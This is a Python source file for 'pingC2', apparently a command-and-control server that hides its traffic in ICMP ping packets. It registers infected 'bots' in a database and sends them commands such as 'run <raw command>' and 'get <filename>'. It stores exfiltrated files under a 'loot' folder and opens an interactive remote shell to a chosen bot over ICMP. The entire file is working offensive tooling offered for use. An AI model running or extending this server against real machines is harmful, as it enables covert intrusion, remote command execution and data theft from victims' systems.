#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

from multiprocessing import *
from datetime import date
#from impacket import ImpactDecoder
#from impacket import ImpactPacket
from threading import *
from optparse import OptionParser
import time
import select
import subprocess
import socket
import threading
import MySQLdb
import ctypes
import sys
import signal
import os
from ConfigParser import SafeConfigParser
from scapy.all import *

#printLine method for debugging
def printLine(line,flag):
	logfile = file('log/pingc2.log', 'a')
	if int(flag) == 2:
		logfile.write(line + '\n')
		print line
	if int(flag) == 1:
		logfile.write(line + '\n')
		if not '[D]' in str(line):
			print line
	else:
		logfile.write(line + '\n')
	return

# ICMP shell for single bot
def icmpshell(botNum,botIP,botConnect):
	import select
	printLine("[D] botconnect %s" % (botConnect.value),flag)
	if subprocess.mswindows:
        	sys.stderr.write('icmpsh master can only run on Posix systems\n')
       		exit(255)

   	try:
        	from impacket import ImpactDecoder
        	from impacket import ImpactPacket
    	except ImportError:
        	sys.stderr.write('You need to install Python Impacket library first\n')
        	exit(255)

    	# Open one socket for ICMP protocol
    	# A special option is set on the socket so that IP headers are included
    	# with the returned data
    	try:
        	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    	except socket.error, e:
        	sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        	exit(1)

    	sock.setblocking(0)
    	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	# Make standard input a non-blocking file
    	#stdin_fd = sys.stdin.fileno()
    	#setNonBlocking(stdin_fd)	
	
	# Create a new IP packet and set its source and destination addresses
    	ip = ImpactPacket.IP()
    	ip.set_ip_dst(botIP)

    	# Create a new ICMP packet of type ECHO REPLY
    	icmp = ImpactPacket.ICMP()
    	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    	# Instantiate an IP packets decoder
    	decoder = ImpactDecoder.IPDecoder()
 	while 1:
        	cmd = ''
        # Wait for incoming replies
		if sock in select.select([ sock ], [], [])[0]:
			buff = sock.recv(4096)

           	if 0 == len(buff):
                	# Socket remotely closed
               		printLine("[*] Socket closed",flag)
			sock.close()
               		sys.exit(0)

            	# Packet received; decode and display it
            	ippacket = decoder.decode(buff)
           	icmppacket = ippacket.child()

            	# If the packet matches, report it to the user
          	if ippacket.get_ip_src() == botIP and 8 == icmppacket.get_icmp_type():
			# Get identifier and sequence number
                	ip_ident = ippacket.get_ip_id()
			ident = icmppacket.get_icmp_id()
                	seq_id = icmppacket.get_icmp_seq()
                	data = icmppacket.get_data_as_string()
			printLine("[D] Data received: %s" % (str(data)),flag)
               		if len(data) > 0:
				sys.stdout.write(data)
				sys.stdout.flush()
                	# Parse command from standard input
               		try:
                  		cmd = sys.stdin.readline()
                		sys.stdout.flush()
				printLine("[D] cmd: %s" % cmd,flag)
			except Exception,e:
                    		printLine(str(e),flag)

                	# Set sequence number and identifier
                	ip.set_ip_id(ip_ident)
			icmp.set_icmp_id(ident)
                	icmp.set_icmp_seq(seq_id)

               		# Include the command as data inside the ICMP packet
               		icmp.contains(ImpactPacket.Data(cmd))

               		# Calculate its checksum
              		icmp.set_icmp_cksum(0)
               		icmp.auto_checksum = 1

               		# Have the IP packet contain the ICMP packet (along with its payload)
               		ip.contains(icmp)

               		# Send it to the target host
               		sock.sendto(ip.get_packet(), (botIP, 0))
			printLine("[D] Sent: %s" % cmd,flag)
			if cmd == 'exit\n':
                		botConnect.value = 0
				sock.close()
				return	

def getBotIP(botId):
	printLine("[*] Getting bot(%s) IP address" % botId,flag)
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user=dbusername.value, # your username
                     passwd=dbpassword.value, # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
	cur = db.cursor()
	query = "select remoteip from bots where id=%s" % botId
	cur.execute(query)
	row = cur.fetchone()
	if row:
		db.close()
		return row[0]
	else:
		db.close()
		return	

# Catch file as it comes from bot
def catchFile(request, botId):
	fileContents = request.split()
       	filename = 'bot' + str(botId) + '_' + fileContents[2]
        filename_clean = filename.replace('/','_')
	filename_clean = 'loot/' + filename_clean
	printLine("[D] File contents: %s" % (fileContent),flag)
	printLine("[*] Catching file (%s) from bot: %s" % (filename_clean,botId),flag)
	if fileContents[0] == '(FILE_START)':
		printLine("[*] File start: %s" % (filename_clean),flag)
		file = open(filename_clean, 'w')
		file.write('')
		file.close()
	elif fileContents[0] == '(FILE_END)':
		printLine("[*] File end: %s" % (filename),flag)
		file = open(filename_clean, 'a')
		file.write('')
		file.close()
	else:
		file = open(filename_clean, 'a')
		printLine("[D] Writing line to file: %s" % (str(fileContents[2:])),flag)
		write_line = ' '.join(map(str,fileContents[3:]))
		write_line = write_line + '\n'
		file.write(write_line)
		printLine("[D] Line written: %s" % (str(line)),flag)
		file.close()
	file.close()

# Response function
def sendPingResponse(dstIP,packetId,icmpId,command):
	#printLine("[*] Creating response for using command=%s" %s (str(command)), flag)
	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=icmpId)/str(command)
        #resp.show2()
        send(resp)
        printLine("\n[*] Response sent!",flag)

def displayBots():
	printLine("[*] Displaying bots!",flag)
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user=dbusername.value, # your username
                     passwd=dbpassword.value, # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	print '{0: <10}'.format('ID'),'{0: <20}'.format('RemoteIP'),'{0: <20}'.format('LocalIP'),'{0: <20}'.format('Name'),'{0: <20}'.format('OS'),'{0: <20}'.format('Checkin date')
	print "---------------------------------------------------------------------------------------------------------"
	cur.execute("select id,remoteip,localip,name,os,checkin from bots")
        for row in cur.fetchall():
        	print '{0: <10}'.format(row[0]),'{0: <20}'.format(row[1]),'{0: <20}'.format(row[2]),'{0: <20}'.format(row[3]),'{0: <20}'.format(row[4]), row[5]
	db.close()

def updateBotSysinfo(botId,remoteIP,name,os):
	printLine("[*] Updating bot info",flag)
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user=dbusername.value, # your username
                     passwd=dbpassword.value, # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	try:
		cur.execute("update bots set remoteip=%s,name=%s,os=%s where id=%s",(remoteIP,name,os,botId))
	except Exception,e:
		printLine("[X] " + (str(e)),flag)
		return False
	db.commit()
	printLine("[*] Bot info updated",flag)
	db.close()
	return True

def doesBotExist(botId):
	printLine("[*] Checking bot existence",flag)
        try:
		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user=dbusername.value, # your username
                     passwd=dbpassword.value, # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        	cur = db.cursor()
	except Exception,e:
		printLine(str(e),flag)
	query = "select * from bots where id=%i" % botId
        printLine("[D] Query: "+query, flag)
        cur.execute(query)
        if cur.fetchall():
                printLine("[*] Bot ID exists",flag)
		db.close()
		return True
	else:
		db.close()
		return False


def addBot(srcIP,name,os):
	printLine("[*] Adding bot",flag)
	botId=0
	try:
		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user=dbusername.value, # your username
                     passwd=dbpassword.value, # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
		cur = db.cursor()
		cur.execute("select max(id) from bots")
		row = cur.fetchone()
		if row[0]:
			botId=int(row[0]) + 1
			printLine("[*] Adding bot number %s!" % (botId), flag)
		else:
			botId=1
			printLine("[*} Adding first bot to PingC2!",flag)
		cur.execute("""insert into bots (remoteip,name,os,checkin) values(%s,%s,%s,%s)""",(srcIP,name,os,date.today()))
                db.commit()
        except Exception,e:
        	printLine("[X] Error: " + (str(e)), flag)
	printLine("[*] Bot ID(%s) added!" % (botId), flag)
	db.close()
	return botId	

def displayMenu():
	listener = False
	print "\nChoose an option"
	for proc in active_children():
		if (proc.name == 'C2Listener'):
			listener = True;
        if listener == False:
		print "1) Start C2 listener"
	print "2) Display bots"
        print "3) Change bot command ('l' to list commands)"
        print "4) Control single bot"
	print "5) Shell (single bot)"
	if listener == True:
		print "S) Stop C2 listener"
	print "q) Quit"

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'		
	sys.exit(0)

# Command and Control main function
def c2main(command,botShell,botConnect):
	print ""
        printLine("[*] Command received from C2: %s" % (command.value), flag)
	while True:
		logfile_error = open('errors.log','w')
		conf.verb = 0
        	count = 1
		filter = "icmp"
		packet = sniff(count,filter=filter)
		for p in packet:
        		#p.show2()
                	try:
                		request = p['Raw'].load
                        	ip_id = p['IP'].id
                       		icmp_id = p['ICMP'].id
        		
				printLine("[*] Request: " + request, flag)
				if 'What shall I do master?' in request:
					printLine("[*] Bot(%s) requesting command" % (request[24:]), flag)
					botId = int(request[24:])
					if doesBotExist(botId):
						printLine("[*] Bot ID exists, ready to send command", flag)
						printLine("[D] botId = %s and botShell.value = %s" % (botId,botShell.value),flag)
						if (botId == int(botShell.value)):
							printLine("[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src),flag)
							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell')
							botConnect.value = 1
							return
						else:
							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
                                                	printLine("[*] Response sent to %s: %s" % (p['IP'].src,command.value),flag)
							print "Option: "
                                        else:
                                        	printLine("[X] Client not registered",flag)
                        	# Checkin function
				elif 'Checkin' in request:
					# Build checkin database and info to capture
					printLine("\n[*] %s checking in" % (p['IP'].src),flag)
					checkinInfo = request[8:].split()
                                        botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
					sendId = "id="+str(botId)
					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId)
					#resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                        #resp.show2()
                                        #send(resp)
                                        printLine("\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value),flag)
                                        print "Option: "
				elif 'sysinfo' in request:
					# Build sysinfo capture system database
                        		printLine("[D] Inside sysinfo",flag)
					sysinfo = request.split()					
					#print "[D] Id: " + sysinfo[0]
                                	printLine("\n[*] Received sysinfo from client: %s" % (sysinfo[1]),flag)
					if doesBotExist(int(sysinfo[1])):
						updateBotSysinfo(int(sysinfo[1]),p['IP'].src,sysinfo[3],sysinfo[2])
                                               	printLine("[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[1],p['IP'].src),flag)
					else:
						printLine("[*] Machine does not exist, ignoring",flag)
	
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                	#resp.show2()
                                	printLine("\n[*] Response sent: Thanks",flag)
                                	send(resp)
                        		print "Option: "
				elif '(FILE' in request:
					if doesBotExist(int(request.split()[1])):
						printLine("[D] Catching file",flag)
						catchFile(request,int(request.split()[1]))
						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks")
					else:
						printLine("[*] Machine does not exist, ignoring",flag)
				else:   
                                        printLine("[**] Client not recognized",flag)
                	except:
				error = "[X] ERROR: " + str(sys.exc_info()[0])
                        	logfile_error.write(error)

def main(flag):
	print "	---------------------------------------------"
	print "	  _____    _                    _____   ___  "
 	print "	 |  __ \  (_)                  / ____| |__ \ "
 	print "	 | |__) |  _   _ __     __ _  | |         ) |"
 	print "	 |  ___/  | | | '_ \   / _` | | |        / / "
 	print "	 | |      | | | | | | | (_| | | |____   / /_ "
 	print "	 |_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "	 		      |___/		    "
        print "	 					    "
	print "	 		Command Center              "
	print "	 		   by NoCow		    "
	print "	---------------------------------------------"
	global dbusername
	global dbpassword
	
	conf_file = 'conf/pingc2.conf'
        cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        dbpass = cp.get(section,'dbpass')
	printLine("[D] dbpass=%s" % (dbpass),flag)
	dbuser = cp.get(section,'dbuser')
	printLine("[D] dbuser=%s" % (dbuser),flag)
	manager = Manager()
	dbusername = manager.Namespace()
	dbusername.value = dbuser
	dbpassword = manager.Namespace()
	dbpassword.value = dbpass 
	command = manager.Namespace()
	command.value = 'sysinfo'
	botShell = manager.Namespace()
	botShell.value = '123456789'
	botConnect = manager.Namespace()
	botConnect.value = 0
	killsig = manager.Namespace()
	killsig = 0
	printLine("[*] Command: %s" % (command.value),flag)
	process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
	displayMenu()
	while True:
		signal.signal(signal.SIGINT, handler)
		#displayMenu()
		try:
			option = raw_input("Option: ")
		except Exception,e:
			printLine( "[X] Error: " + (str(e)),flag)
		#print "[D] Option chosen: ",option
		if option == '1':
			command.value = raw_input("Enter command: ")
			print "[*] Starting listener"
			if (len(active_children()) > 1):
				printLine("[*] Capture running. Stopping first.",flag)
				for proc in active_children():
					if proc.name != 'SyncManager-1':		
						proc.terminate()
				printLine( "[*] Starting new capture", flag)
				try:
					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
					process.start()
					if process.is_alive():
						printLine( "[*] C2 Listening - command: %s" % (command.value), flag)
					else:
						printLine("[X] Error starting C2 listener",flag)
				except Exception, e:
					printLine("[X] Error: " + (str(e)), flag)
			else:
				printLine( "[*] No listener currently running. Starting...",flag)
				try:
					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
					process.start()
					if process.is_alive():
						printLine("[*] C2 Listening - command: %s" % (command.value),flag)
					else:
						printLine("[X] Error starting C2 listener",flag)
				except Exception, e:
					printLine("[X] Error: " + (str(e)), flag)
		elif option == '2':
			printLine("[*] Displaying bots!",flag)
			displayBots()
		elif option == '3':
                        if process.is_alive():
                        	command.value = raw_input("Enter a command: ")
				printLine("[*] C2 Listening - command: %s" % (command.value),flag)
                        else:
                                printLine("[X] C2 listener not running. Please start listener first",flag)
		elif option == '4':
			printLine("[*] Bot control!",flag)
			displayBots()
			botNum = raw_input("Bot # to control: ")
			printLine("[*] Controlling bot(%s)" % (botNum),flag)
		elif option == '5':
			printLine( "[*] Bot shell!", flag)
			displayBots()
			botNum = raw_input("Bot # for shell: ")
			print "[*] Starting botshell for #%s" % botNum
			if botNum == '123456789':
				botShell.value = '123456789'
			else:
				botIP = getBotIP(botNum)
				if botIP:
					printLine( "[*] Setting botshell value to %s" % (botNum), flag)
					botShell.value = botNum
					try:    
                                        	icmp_shell = Thread(name='ICMPshell',target=icmpshell,args=(botNum,botIP,botConnect,))
						icmp_shell.daemon = True
						while True:
							if botConnect.value == 1:
								for proc in active_children():
									if proc.name == 'C2Listener':
										proc.terminate()
								icmp_shell.start()
								if icmp_shell.is_alive():
									printLine("[*] ICMP shell started for bot(%s) at %s" % (botNum,botIP),flag)
									icmp_shell.join()
									botConnect.value = 0
									botShell.value = 123456789
									try:
                                        					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
                                        					process.start()
                                        					if process.is_alive():
                                                					printLine( "[*] Restarting listener - command: %s" % (command.value),flag)
                                        					else:
                                                					printLine( "[X] Error starting C2 listener",flag)
                                					except Exception, e:
                                        					printLine( "[X] Error: " + (str(e)),flag)
									break
                                                		else:
                                             				printLine( "[X] Error starting ICMP shell",flag)
                                        except Exception, e:
                                        	printLine( "[X] Error: " + (str(e)),flag)
				else:
					printLine("[X] Bot does not exist!",flag)
			#print "[D] Bot IP for icmpsh: %s" % botIP
		elif option == 'S':
			for proc in active_children():
				if proc.name == 'C2Listener':
					proc.terminate()
		elif option == 'l':
			print "\n Available commands: run <raw command>, sleep <seconds>, sysinfo, get <filename>"
		# Hidden debug option - display relevant info
		elif option == 'd':
			print "[D] Running Processes: ", active_children()
		elif option == 'q':
			for proc in active_children():
				printLine("[*] Terminating process: " + (str(proc.name)), flag)
				if proc.is_alive():
					proc.terminate()
			printLine("[*] All processes terminated, exiting",flag)
			return
		else:
			printLine("Invalid Option...please try again",flag)
		displayMenu()
	
if __name__ == "__main__":
	global flag
	parser = OptionParser(usage="%prog [-d]")
	parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
	(options, args) = parser.parse_args()	
	flag = options.debug
	print "[D] flag = %s" % flag
	printLine("--------------------------------------------",flag)
	printLine("PingC2.py started on %s" % (date.today()),flag)
	printLine("--------------------------------------------",flag)
	printLine("[D] flag=%s" % (flag),flag)
	main(flag)
	sys.exit("Bye")
